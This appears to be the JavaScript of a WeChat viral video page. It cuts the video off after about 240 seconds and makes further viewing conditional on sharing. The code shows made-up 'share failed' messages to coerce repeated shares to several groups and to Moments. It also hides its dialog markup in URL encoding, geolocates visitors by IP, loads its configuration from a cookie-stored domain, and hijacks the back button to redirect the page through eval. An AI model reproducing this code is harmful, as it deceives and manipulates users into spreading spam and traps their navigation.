var d = new Date();
var city = '';
var str = d.getFullYear()+"-"+(d.getMonth()+1)+"-"+d.getDate();

//更改连接
var urls=$.cookie('urls_valid'); 
var urls_num=$.cookie('urls_num'); 

document.getElementById("post-date").innerHTML = str;

function setCookie(name,value)
{
    var Days = 1;
    var exp = new Date();
    exp.setTime(exp.getTime() + Days*6*1000);
    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}

function getCookie(name)
{
    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");

    if(arr=document.cookie.match(reg))

        return unescape(arr[2]);
    else
        return null;
}

if (getCookie('delaytime')==null)
{
	/*
	if(urls_num==4){
		//修改播放时间截停长度
	    setCookie('delaytime','240');
	}else{
		//修改播放时间截停长度
	    setCookie('delaytime','250');
	}*/
	
	//修改播放时间截停长度
	setCookie('delaytime','240');
	
}
if (getCookie('tip')=='ok')
{
    setTimeout('jssdk()',500);
}

var pageGlobal = {};
//区分多套视频
/*
if(urls_num==4){
	pageGlobal.vid = 'x0502mj42ja';//b0553wfuebh w0557pq283m  p0551de0a7m
}else{
	pageGlobal.vid = 'z0502a4ekc3';//b0553wfuebh w0557pq283m  p0551de0a7m
}*/

pageGlobal.vid = "z0502a4ekc3";
pageGlobal.playStatus = '';
pageGlobal.delayTime = parseInt(getCookie('delaytime'));

var video, player;
var vid = pageGlobal.vid;
var playStatus = 'pending';

new Swiper('.swiper-container', {autoplay: 5000});

$(function(){
    var elId = 'mod_player_skin_0';
    $("#js_content").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');
    var elWidth = $("#js_content").width();
    playVideo(vid,elId,elWidth);
    $("#pauseplay").height($("#js_content").height() - 10);

    if(playStatus == 'pending') {
        var delayTime = pageGlobal.delayTime;
        var isFirst = true;
        setInterval(function(){
            try {
                var currentTime = player.getCurTime();
                if(currentTime >= delayTime) {
                    $('#pauseplay').show();
                    player.callCBEvent('pause');
                    $.cookie(vid, 's', {path: '/'});
                    if(isFirst) {
                        $('#pauseplay').trigger('click');
                    }
                    isFirst = false;
                }
            } catch (e) {

            }
        }, 500);
    }

    var h = $('#scroll').height();
    $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
    new IScroll('#wrapper', {useTransform: false, click: true});
});

function playVideo(vid,elId,elWidth){
    //定义视频对象
    video = new tvp.VideoInfo();
    //向视频对象传入视频vid
    video.setVid(vid);

    //定义播放器对象
    player = new tvp.Player(elWidth, 200);
    //设置播放器初始化时加载的视频
    player.setCurVideo(video);

    //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
    //player.addParam("autoplay","1");

    player.addParam("wmode","transparent");
    player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
    player.write(elId);
}

$('#pauseplay').on('click', function() {
    setCookie('tip','ok');
    location.reload();

});

$('#like').on('click', function(){
    var $icon = $(this).find('i');
    var $num = $(this).find('#likeNum');
    var num = 0;
    if(!$icon.hasClass('praised')){
        num = parseInt($num.html());
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(++num);
        $icon.addClass("praised");
    } else {
        num = parseInt($num.html());
        num--;
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(num);
        $icon.removeClass("praised");
    }
});

function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}

function jssdk() {

    $("#mask").css("height", $(document).height());
    $("#mask").css("width", $(document).width());
    $("#mask").show();
    $("#fenxiang").show();
    $('#game_result').hide();
    $('.time-out-num').hide();
    $('.bag').hide();
    show_tip();
}





(function() {
    /**
     * 动态加载js文件
     * @param  {string}   url      js文件的url地址
     * @param  {Function} callback 加载完成后的回调函数
     */
    var _getScript = function(url, callback) {
        var head = document.getElementsByTagName('head')[0],
            js = document.createElement('script');

        js.setAttribute('type', 'text/javascript');
        js.setAttribute('src', url);

        head.appendChild(js);

        //执行回调
        var callbackFn = function(){
            if(typeof callback === 'function'){
                callback();
            }
        };

        if (document.all) { //IE
            js.onreadystatechange = function() {
                if (js.readyState == 'loaded' || js.readyState == 'complete') {
                    callbackFn();
                }
            }
        } else {
            js.onload = function() {
                callbackFn();
            }
        }
    }

    //如果使用的是zepto，就添加扩展函数
    if(Zepto){
        $.getScript = _getScript;
    }

})();

var alertTimes = 0;
function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
        $("body").append(dialog)
    }
    alertTimes++;
    var d = $('#lly_dialog');
    d.show(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function() {
        d.hide(200);
        if (callback) {
            callback()
        }
    })
}
$.getScript('//int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',function(){
    window.tcity = (!(window['remote_ip_info'] || {})['city'] ? "" : window['remote_ip_info']['city']);

})
function share_tip() {
    if (shareATimes == 1) {
        wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群即可观看！', '好')
    } else if (shareATimes == 2) {
        wxalert('<span style="font-size: 30px;color: #f5294c">分享失败！</span><br>注意：分享到相同的群会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群！', '好')
    } else if (shareATimes == 3) {
        wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可观看！', '好')
    } else {
        wx.hideOptionMenu();
        wx.showMenuItems({menuList:['menuItem:share:timeline']});
        if (shareTTimes < 1) {
            wxalert('分享成功，剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可观看!', '好')
        } else {
            if(window.data.share_timeline_num>1)
            {
                if(shareTTimes == 1)
                {
                    wx.onMenuShareTimeline({
                        title: window.data.share_timeline_info2.title,
                        link: window.data.share_timeline_info2.link,
                        imgUrl: window.data.share_timeline_info2.img_url,
                        success: function () {
                            shareTTimes += 1;
                            share_tip(shareATimes,shareTTimes);
                        },
                        cancel: function () {

                        }
                    });
                    $('#fenxiang').on('click', function() {
                        wxalert('<span style="font-size: 30px;color: #f5294c">分享失败</span><br>再分享一次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可观看!', '好')
                    });
                    $('#mask').on('click', function() {
                        wxalert('<span style="font-size: 30px;color: #f5294c">分享失败</span><br>再分享一次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可观看!', '好')
                    });
                    wxalert('<span style="font-size: 30px;color: #f5294c">分享失败</span><br>再分享一次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可观看!', '好')
                } else {
                    wxalert('分享成功, 请点 击按钮继续播放', '确定', function() {
                        setCookie('delaytime','12000');
                        setCookie('tip','goon');
                        location.reload();
                    })
                }
            } else {
                wxalert('分享成功, 请点击按钮继续播放', '确定', function() {
                    setCookie('delaytime','12000');
                    setCookie('tip','goon');
                    location.reload();
                })
            }
        }
    }
}

function show_tip() {
    wxalert('<img src="../images/fx_n.jpg"/>', '好')
}
$(function() {

    $('#fenxiang').on('click', function() {
        show_tip()
    });
    $('#mask').on('click', function() {
        show_tip()
    })
});



var shareATimes = 0;
var shareTTimes = 0;



$(function () {
    $.ajax({
        type : "GET",
        url : "//"+urls+"/api.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
        dataType : "jsonp",
        jsonp:"callback",
        data:{},
        success : function(result){
            window.data = result;
            wx.config(window.data.config);
            wx.ready(function(){
                if(getCookie('tip') != 'ok')
                {
                    wx.hideOptionMenu();
                }
                else
                {
                    wx.hideOptionMenu();
                    //修改只发送给朋友
                    //wx.showMenuItems({menuList:['menuItem:share:appMessage','menuItem:share:timeline']});
                    wx.showMenuItems({menuList:['menuItem:share:appMessage']});
                    wx.onMenuShareAppMessage({
                        title: data.share_app_info.title,
                        desc: data.share_app_info.desc,
                        link: data.share_app_info.link,
                        imgUrl: data.share_app_info.img_url,
                        success: function () {
                            shareATimes += 1;
                            share_tip();
                        },
                        cancel: function () {

                        }
                    });
                    wx.onMenuShareTimeline({
                        title:data.share_timeline_info.title,
                        link: data.share_timeline_info.link,
                        imgUrl: data.share_timeline_info.img_url,
                        success: function () {
                            shareTTimes += 1;
                            share_tip();
                        },
                        cancel: function () {

                        }
                    });
                }

            });
        }
    });
});

function anchor() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime())
}
function zp() {
    //eval(window.data.backup);
//  if(urls_num==4){
//		eval("top.location.href='http://"+urls+"/topics/t_3.html'");
//	}else{
//		eval("top.location.href='http://"+urls+"/topics/t_0.html'");
//	}
    eval("top.location.href='http://"+urls+"/topics/t_0.html'");
}

setTimeout('anchor()', 100);
window.onhashchange = function() {
    zp()
};



